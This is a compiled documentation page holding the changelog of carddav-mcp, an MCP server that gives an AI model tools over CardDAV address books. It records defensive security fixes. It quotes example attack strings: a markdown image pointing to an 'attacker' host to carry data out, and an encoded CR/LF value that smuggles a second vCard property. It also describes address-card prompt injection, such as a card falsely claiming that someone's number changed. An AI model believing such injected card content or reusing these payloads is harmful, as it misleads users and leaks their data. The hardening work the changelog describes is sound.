import{_t as e,it as t,n,rt as r}from"./chunks/framework.BVGGWBQY.js";var i=JSON.parse(`{"title":"Changelog","description":"","frontmatter":{},"headers":[],"relativePath":"reference/changelog.md","filePath":"reference/changelog.md","lastUpdated":1788697387000}`),a={name:`reference/changelog.md`};function o(n,i,a,o,s,c){return e(),r(`div`,null,[...i[0]||=[t(`<h1 id="changelog" tabindex="-1">Changelog <a class="header-anchor" href="#changelog" aria-label="Permalink to “Changelog”">​</a></h1><h2 id="_0-1-3-2026-09-08" tabindex="-1"><a href="https://github.com/ni-c/carddav-mcp/releases/tag/v0.1.3" target="_blank" rel="noreferrer">0.1.3</a> - 2026-09-08 <a class="header-anchor" href="#_0-1-3-2026-09-08" aria-label="Permalink to “0.1.3 - 2026-09-08”">​</a></h2><h3 id="fixed" tabindex="-1">Fixed <a class="header-anchor" href="#fixed" aria-label="Permalink to “Fixed”">​</a></h3><ul><li><strong>A card wrapped in <code>&lt;![CDATA[…]]&gt;</code> is read instead of counted as unreadable.</strong> <code>address-data</code> is a <code>stopNodes</code> entry, so the parser hands back its raw source rather than its text — and the XML packaging comes with it. Open-Xchange (mailbox.org) wraps the card, so every card arrived beginning <code>&lt;![CDATA[BEGIN:VCARD</code> and no vCard parser would touch it: an address book of 79 cards listed as empty, with a note saying 78 could not be parsed. The sections are now taken off and joined, including the split a server has to make around a card containing <code>]]&gt;</code>. Entity references <strong>inside</strong> a section are left alone, because that is what a CDATA section means: a note that says <code>&amp;amp;</code> says five characters, and it used to arrive as one.</li><li><strong>An indented response is read too.</strong> <code>trimValues</code> does not reach a stop node, so a server that pretty-prints its XML handed over <code>\\n BEGIN:VCARD…</code>, and a vCard has to start at <code>BEGIN:</code>. Leading and trailing whitespace is packaging as much as the CDATA markers are.</li></ul><h3 id="changed" tabindex="-1">Changed <a class="header-anchor" href="#changed" aria-label="Permalink to “Changed”">​</a></h3><ul><li><strong>A CR or LF reference is decoded only where a real newline follows it.</strong> sabre/dav encodes the vCard&#39;s own line endings as <code>&amp;#13;</code> and has to: XML normalises a raw CR to LF on the way in, so escaping it is the only way to keep it. That shape — the reference immediately before the newline it stands for — is now the whole of the exception. A reference smuggled into a <em>value</em> has no real newline behind it, so <code>FN:harmless&amp;#13;&amp;#10;EMAIL:x@y.z</code> stays literal and invents no second property. The relaxation used to cover both code points everywhere in the card. caldav-mcp applies the same rule to <code>calendar-data</code>; the two servers disagreed here, and only one of them could have been right.</li><li><code>mcp-tool-allowlist</code> 0.2.2.</li></ul><h2 id="_0-1-2-2026-09-07" tabindex="-1"><a href="https://github.com/ni-c/carddav-mcp/releases/tag/v0.1.2" target="_blank" rel="noreferrer">0.1.2</a> - 2026-09-07 <a class="header-anchor" href="#_0-1-2-2026-09-07" aria-label="Permalink to “0.1.2 - 2026-09-07”">​</a></h2><p>The follow-ups from the caldav-mcp review of the same week, applied to the sibling: the same guard shape, the same property, one function moved to the library it belongs to.</p><h3 id="fixed-1" tabindex="-1">Fixed <a class="header-anchor" href="#fixed-1" aria-label="Permalink to “Fixed”">​</a></h3><ul><li><strong><code>list_groups</code> survives a card that shapes badly.</strong> The parser is lazy: a value it cannot decode throws on the read, not on the parse. <code>list_contacts</code> has guarded parsing and shaping together since 0.1.1; <code>list_groups</code> guarded the parse only, so one such card took the whole listing down where an unparseable one was merely counted. Shaping now happens inside the same per-card guard and joins the same count, and the note says &quot;could not be read&quot; rather than &quot;could not be parsed&quot; because it now covers both. The three other places that guarded the parse alone — the local re-filter behind <code>search_contacts</code>, the group scan, and the member index — read the card inside the guard as well.</li></ul><h3 id="changed-1" tabindex="-1">Changed <a class="header-anchor" href="#changed-1" aria-label="Permalink to “Changed”">​</a></h3><ul><li><code>orderedResourceKey</code> comes from mcp-approval 0.8.2 instead of a local copy. Same function, same NUL-and-index prefix, one home. mcp-approval 0.8.1 also made a sealed dialog answer single-use; this release carries that pin.</li></ul><h3 id="added" tabindex="-1">Added <a class="header-anchor" href="#added" aria-label="Permalink to “Added”">​</a></h3><ul><li>A property test over the shape layer: for any card that parses, with any value in any of the thirty-one properties this server reads, in either vCard version, shaping does not throw, the result validates against the output schema, and nothing it returns carries a raw control character. The examples in the other files cover the values that were tried; this states the contract over every value the generator can spell.</li></ul><h2 id="_0-1-1-2026-09-06" tabindex="-1"><a href="https://github.com/ni-c/carddav-mcp/releases/tag/v0.1.1" target="_blank" rel="noreferrer">0.1.1</a> - 2026-09-06 <a class="header-anchor" href="#_0-1-1-2026-09-06" aria-label="Permalink to “0.1.1 - 2026-09-06”">​</a></h2><p>A security review of 0.1.0 — every module, the tests, the workflows and the image — with the findings fixed rather than reported. Nothing here needed a protocol change; every fix is behind the same seventeen tools.</p><h3 id="security" tabindex="-1">Security <a class="header-anchor" href="#security" aria-label="Permalink to “Security”">​</a></h3><ul><li><strong>Two quadratic regular expressions on text a card author or the server chooses.</strong> <code>base64Bytes</code> measured a <code>PHOTO</code>&#39;s padding with <code>/=*$/</code>, which is retried from every position of a run of <code>=</code> — 80 000 of them cost two seconds in <code>get_contact</code>, a card at the 1 MiB read ceiling cost minutes, and anyone with write access to a shared address book can store one. The same shape in <code>resourceNameOf</code> (<code>/[^/]*$/</code>) ran on every <code>&lt;D:href&gt;</code> of every listing, so one response with a long segment held the process for as long as the server liked. Both are <code>lastIndexOf</code> now, <code>normalisePath</code> and <code>resourceUrl</code> had the same pattern and are loops, and an href longer than 8 KiB is dropped by the multistatus parser before anything walks it. A test file times each of them at its maximum size.</li><li><strong>A prototype key in <code>PHOTO;TYPE=</code> crashed every listing the card was in.</strong><code>mediaTypeOf</code> looked the format up in an object literal, so <code>TYPE=constructor</code> returned <code>Object</code> itself where a string was promised, and the projection threw <code>input.normalize is not a function</code> out of <code>list_contacts</code>, <code>search_contacts</code> and <code>get_contact</code> — outside the guard that skips an unparseable card. The lookup uses <code>Object.hasOwn</code>, and a card that parses but cannot be shaped is now counted and skipped like one that does not parse.</li><li><strong>Approval keys are bound to positions.</strong> <code>setResourceKey</code> sorts its targets, which is right for a set and wrong for a tuple: <code>update_group</code> spelled the name and the note identically, so a token issued for <code>{name: &quot;Team&quot;, note: &quot;internal&quot;}</code> also executed <code>{name: &quot;internal&quot;, note: &quot;Team&quot;}</code>, and <code>move_contact</code> listed source and destination together, so an approval to move a card from Work to Private also authorised moving a card of the same name from Private to Work. Every key is built with <code>orderedResourceKey</code>, which prefixes each part with its index.</li><li><strong><code>delete_contact</code> no longer deletes a group card</strong>, <code>move_contact</code> no longer moves one, and a <code>raw_vcard</code> that is a group is refused by <code>create_contact</code> and <code>update_contact</code>. The first made <code>delete_group</code> a capability that <code>CARDDAV_DENY_TOOLS=delete_group</code> did not remove; the second left a group whose every member was unresolvable under a dialog that said &quot;move a contact&quot;; the third turned a contact into a group under &quot;replace a contact card&quot;. All four refuse before anybody is asked.</li><li><strong><code>CARDDAV_ADDRESSBOOKS</code> entries are no longer quoted verbatim.</strong> An entry that matched nothing was printed in full — to stderr, which is the MCP client&#39;s log, and into the <code>list_address_books</code> answer, which is the model&#39;s context — and an entry that matches nothing is exactly what a token pasted into the wrong line looks like. A path, a URL or a short segment name is quoted; anything else is described by its length. The startup warning about unencoded paths escapes the characters it fires on, and the <code>ELICITATION</code> and <code>CARDDAV_MAX_CONTACTS</code> diagnostics cut and escape what they were given.</li><li><strong><code>export_contacts</code> defuses its text channel.</strong> Both channels carried the stored bytes, so a <code>NOTE</code> of <code>![…](https://attacker/x.png?d=…)</code> came back for a client to render and fetch. <code>structuredContent</code> is still the byte-exact export; the text block is a fenced, datamarked rendering with invisible characters removed and image markers broken, says so on its first line, and carries the injection warning.</li><li><strong>Server-chosen strings in unmarked answers are cleaned.</strong> <code>get_server_info</code> reported the principal and home hrefs raw beside the header tokens it had been careful about, and a path segment of <code>![leak](https://…)</code> survives <code>new URL()</code>; <code>list_changes</code>, <code>delete_contact</code> and <code>delete_group</code> reported the collection path raw in this server&#39;s own voice; the address book <code>url</code> was raw in <code>list_address_books</code>. All go through the short-text cleaner.</li><li><strong>The fenced text block is measured against the result budget.</strong> It was a third channel beside the two the budget measured, so a card just under the ceiling went out at roughly three times it. The budget can also drop from an array one level down now, so <code>get_group</code> on a large group is shortened rather than refused.</li><li><strong>An upstream error body is quoted on one line, labelled and short</strong>, with the DAV precondition element name capped — a server could put two thousand characters with line breaks into the one answer that carries no untrusted marker. The body is read <em>after</em> the status is decided and under its own small ceiling, so a two-megabyte login page with a <code>401</code> reports the <code>401</code> and the credentials hint instead of &quot;the answer was larger than … bytes&quot;.</li><li><strong>A refused login is remembered for ten seconds.</strong> Every request authenticates, and a model that reads &quot;authentication refused&quot; retries a tool annotated cheap and read-only; hosted providers lock an account after a handful of failed logins. The same refusal is repeated from memory inside the window, and says so.</li><li><strong>A server ETag with a control character, or longer than a kilobyte, is treated like a weak one.</strong> It went into <code>If-Match</code> unchecked, undici refused the header, and every write to that card failed as <code>fetch failed</code> for as long as the server kept sending it. The write path now refuses with its usual sentence about a missing guard.</li><li><strong>A refused redirect is explained.</strong> undici&#39;s <code>unexpected redirect</code> reached the model as <code>fetch failed</code>; the error now says the server redirected, that carddav-mcp does not follow one, and that <code>CARDDAV_URL</code> should name the address the server redirects to.</li><li><strong>Discovery is bounded.</strong> The registry keeps at most 256 address books and reports the overflow; a collection listed outside the home it was listed from is dropped, the way a card listed outside its collection already was.</li><li><strong><code>get_contact_photo</code> hands over nothing it cannot name.</strong> Bytes that are not JPEG, PNG, GIF or WebP used to go out as an <code>image</code> block labelled <code>application/octet-stream</code>; they are refused with a sentence.</li><li><strong>URL-shaped fields lose their userinfo.</strong> <code>URL</code>, <code>IMPP</code>, a <code>PHOTO</code> stored as a link and a group&#39;s <code>MEMBER</code> reference can carry <code>user:password@</code>, and only <code>CARDDAV_URL</code> was redacted.</li><li><strong>The publish job installs with <code>--ignore-scripts</code>.</strong> It is the one job that holds an npm publishing token, and it ran every dependency&#39;s install hook while holding it; the audit job and the Dockerfile already installed this way. <code>actions/dependency-review-action</code> runs on pull requests, and the GitHub release is created with <code>--verify-tag</code>.</li><li><strong>The runtime image drops yarn and the lockfile.</strong> npm and corepack were already removed; yarn was not, and the lockfile is an inventory of the dependency tree that nothing in the image reads.</li><li><code>mcp-approval</code> 0.8.1: a sealed request state is single-use, so an answer to a confirmation dialog cannot be presented twice.</li></ul><h3 id="changed-2" tabindex="-1">Changed <a class="header-anchor" href="#changed-2" aria-label="Permalink to “Changed”">​</a></h3><ul><li><code>sync_token</code> is validated on the way in with the same rule as on the way out (a URI, at most 512 characters), and <code>list_address_books</code> returns it verbatim or not at all — it used to clean it, which cut a long token with an ellipsis and broke the next sync against a server doing nothing wrong.</li><li><code>raw_vcard</code> refuses control characters other than line breaks, and a date has to exist: the 31st of February is refused, a yearless 29th is not.</li><li>oxlint&#39;s <code>suspicious</code> category is on, <code>target</code> is ES2023 for <code>toSorted()</code>, and the coverage thresholds rose to 95 / 87 / 96 / 96.</li><li><code>docs/reference/tools.md</code> is written by hand again. It used to be generated from the registered tools, which kept it in step with the code at the price of a page nobody could edit: <code>--check</code> compared it byte for byte, so every line had to be derivable and a paragraph about how an endpoint really behaves had nowhere to go. A test now asserts what the generator guaranteed — the page documents exactly the tools that exist, marks exactly the <code>essential</code> preset, and marks exactly the tools that ask a person first — and leaves the prose to a person.</li><li><code>icon-512.png</code> is generated by <code>svg-asset-set</code> 0.3.0 from the favicon rather than rendered by hand, so <code>npm run assets:check</code> covers it and it cannot drift from the icon the docs site serves.</li></ul><h3 id="added-1" tabindex="-1">Added <a class="header-anchor" href="#added-1" aria-label="Permalink to “Added”">​</a></h3><ul><li>A test asserting the server warns about untrusted content in <code>instructions</code>, the one channel a model reads before it calls anything.</li><li>The Glama badge, now that the listing exists. Eleventh and last but one in the row, which is the full set.</li></ul><h3 id="fixed-2" tabindex="-1">Fixed <a class="header-anchor" href="#fixed-2" aria-label="Permalink to “Fixed”">​</a></h3><ul><li><code>hintFor</code> explains a <code>valid-sync-token</code> refusal: drop the token and start over without one.</li><li><code>get_group</code> reports how many cards in the book share a UID and resolves the first the server listed, instead of silently re-pointing a member at the last.</li><li>The sanitisers cut their input before defusing image markers, which expanded two characters into thirty-one over the whole input first.</li><li><code>writeAddress</code> folds line breaks like every other serialiser, and the four reads that bypassed <code>propertyValue</code> go through it.</li><li>The error message that refuses a group where a contact was meant no longer names a tool the <code>essential</code> preset does not register.</li><li>The fake CardDAV server in the unit suite records request headers, refuses a PUT or DELETE without a guard, and can issue weak or malformed ETags, answer 412, and fail a scripted request — so the write guards are proven on the wire rather than assumed.</li><li>Two overlapping labels in the architecture diagram. <code>PROPFIND · REPORT · PUT</code> was about 150px on one line in a 100px gap, so it was drawn across the right edge of the carddav-mcp box and into the CardDAV box, on top of the text already there; the three verbs are stacked now. <code>Radicale, Baikal, Nextcloud, …</code> overflowed both edges of its own box and is on two lines.</li></ul><h2 id="_0-1-0-2026-09-06" tabindex="-1"><a href="https://github.com/ni-c/carddav-mcp/releases/tag/v0.1.0" target="_blank" rel="noreferrer">0.1.0</a> - 2026-09-06 <a class="header-anchor" href="#_0-1-0-2026-09-06" aria-label="Permalink to “0.1.0 - 2026-09-06”">​</a></h2><h3 id="added-2" tabindex="-1">Added <a class="header-anchor" href="#added-2" aria-label="Permalink to “Added”">​</a></h3><p>First release. An MCP server for CardDAV: 17 tools over contacts, groups and photos, on any server that speaks the standard.</p><ul><li><strong>17 tools</strong>, 10 read and 7 write. <code>CARDDAV_READ_ONLY=true</code> leaves the write tools unregistered rather than failing them, so they do not appear in <code>tools/list</code> at all.</li><li><strong>A listing is cheap and says so.</strong> <code>list_contacts</code> retrieves only the summary properties, which is the difference between a few kilobytes and several megabytes once inline photos are involved — and every entry it returns is marked <code>partial</code>, because a card retrieved that way is missing everything not asked for. The write path never accepts one: it issues its own <code>GET</code> for the card it is about to replace, every time.</li><li><strong>Writes are read-modify-write over the parsed card</strong>, never a document rebuilt from the fields this server models. An <code>X-</code> property some phone wrote in 2014, a photo nobody mentioned and every parameter survive an edit because they are never touched. Guarded with <code>If-Match</code> from the same read; never <code>If-Match: *</code>; a weak ETag is refused rather than dropped.</li><li><strong>Both group conventions.</strong> vCard 4&#39;s <code>KIND:group</code> with <code>MEMBER</code>, and Apple&#39;s <code>X-ADDRESSBOOKSERVER-KIND</code> on top of vCard 3 — which is what Apple Contacts, Nextcloud and most of the installed base actually store. Both are read; the one written follows whatever the address book already uses, because a group in the other convention is invisible in the client the person is looking at.</li><li><strong>A search is one request, not one per field.</strong> RFC 6352 gives <code>&lt;C:filter&gt;</code> a <code>test</code> attribute defaulting to <code>anyof</code>, so several properties are matched in a single <code>addressbook-query</code>. Whatever comes back is checked again locally, because a server that filters only partially is indistinguishable from one that matched properly, and the result says which path it took.</li><li><strong>Birthdays keep the year they have, and no more.</strong> <code>BDAY:--0415</code> means &quot;15 April, year unknown&quot;, which is what a phone writes when the year was never entered and a large share of real birthdays look like. It is reported as <code>{month, day}</code> rather than mapped to nothing or given an invented year.</li><li><strong><code>CARDDAV_ADDRESSBOOKS</code> fences the server to named address books</strong>, enforced where an id is decoded rather than at the edge of each tool, so no tool can forget it — including a group membership change, which is the one place a fenced-off path could otherwise be named. A listing reports how many collections it withheld instead of quietly being shorter.</li><li><strong>Ids are opaque and carry no origin.</strong> The host is rebuilt from <code>CARDDAV_URL</code> on every decode, so a forged id cannot point this server at another server. Every join of a collection URL and a card name is checked on the <strong>resolved</strong> path: checking the name for a literal <code>/</code> is not the same check, because the URL parser normalises <code>%2E%2E</code> and treats a backslash as a separator.</li><li><strong>Contacts are treated as text a stranger wrote</strong>, because an address book rarely is written only by its owner — cards arrive by import from a phone, by sync from a directory, and from anyone with write access to a shared book. Names, organisations and notes are fenced with a per-call nonce and marked line by line; invisible and directional characters are removed; markdown image syntax is defused. Two of the injection shapes reported are specific to an address book, and the second is the reason contacts are worth attacking at all: a card asserting that somebody&#39;s number or account has changed does not need the model to run a tool, only to be believed.</li><li><strong>Nothing this server says quotes card content.</strong> Not the approval dialogs, not the error messages. Every value an error repeats is escaped, collapsed to one line and cut first, because an error reaches the model in the server&#39;s own voice, outside any fence.</li><li><strong>Photos are reported, not delivered.</strong> <code>get_contact</code> says a photo is there, its type and its size; <code>get_contact_photo</code> returns the bytes as an image when asked for by name. A photo stored as a URI is reported and never fetched — that address was chosen by whoever wrote the card.</li><li><strong>It never fetches an address somebody else chose.</strong> No tool takes a URL. Links returned by the server are pinned to the configured origin and refused if they carry credentials or a scheme this server does not speak — checked again at the point the credentials would leave the process.</li><li><strong><code>CARDDAV_ALLOW_PLAINTEXT</code>.</strong> A plain <code>http://</code> URL to a host that is not loopback refuses to start instead of printing a warning that a stdio deployment never shows. The switch lifts the refusal and is read strictly, like <code>CARDDAV_INSECURE_TLS</code>.</li><li>Bearer or Basic authentication, RFC 6764 discovery from a server root or a collection URL, RFC 6578 <code>sync-collection</code> as <code>list_changes</code>, and a raw vCard export that keeps the properties this server does not model — because an export that dropped them would be a backup that silently loses data.</li></ul>`,28)]])}var s=n(a,[[`render`,o]]);export{i as __pageData,s as default};